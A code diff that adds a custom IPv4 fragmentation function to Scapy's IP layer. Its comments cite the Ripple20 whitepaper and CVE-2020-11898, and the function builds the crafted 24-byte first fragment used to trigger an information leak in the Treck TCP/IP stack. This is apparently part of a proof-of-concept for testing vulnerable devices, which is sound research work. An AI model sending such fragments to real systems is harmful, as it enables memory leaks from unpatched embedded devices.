@@ -607,6 +607,60 @@ class IP(Packet, IPTools):
         return lst
 
 
+#https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf
+#https://blog.nviso.eu/2020/07/16/testing-ripple20-a-closer-look-and-proof-of-concept-script-for-cve-2020-11898/
+
+#https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11898
+    #The Treck TCP/IP stack before 6.0.1.66 improperly handles an IPv4/ICMPv4 Length Parameter Inconsistency, 
+    #which might allow remote attackers to trigger an information leak. 
+
+def fragmentCustom(self):
+    """
+    Modified version of Scapy's "fragment" function 
+    to create custom-size fragments instead of fixed-size
+    ones.
+ 
+    We create one with payload length of 24, as in whitepaper,
+    then the rest (136) bytes of payload go in the second one.
+    """
+    lst = []
+    fnb = 0
+    fl = self
+    while fl.underlayer is not None:
+        fnb += 1
+        fl = fl.underlayer
+ 
+    for p in fl:
+ 
+        s = raw(p[fnb].payload)
+ 
+        # first fragment
+        q = p.copy()
+        del(q[fnb].payload)
+        del(q[fnb].chksum)
+        del(q[fnb].len)
+        q[fnb].flags |= 1 # set fragmentation to true
+        q[fnb].frag += 0
+        r = conf.raw_layer(load=s[0:24]) # copy first 24 bytes
+        r.overload_fields = p[fnb].payload.overload_fields.copy()
+        q.add_payload(r)
+        lst.append(q)
+ 
+        # second fragment
+        q = p.copy()
+        del(q[fnb].payload)
+        del(q[fnb].chksum)
+        del(q[fnb].len)
+        q[fnb].frag += 3
+        r = conf.raw_layer(load=s[24:]) # copy the rest
+        r.overload_fields = p[fnb].payload.overload_fields.copy()
+        q.add_payload(r)
+        lst.append(q)
+ 
+    return lst
+
+    
+    
 def in4_chksum(proto, u, p):
     """
     As Specified in RFC 2460 - 8.1 Upper-Layer Checksums
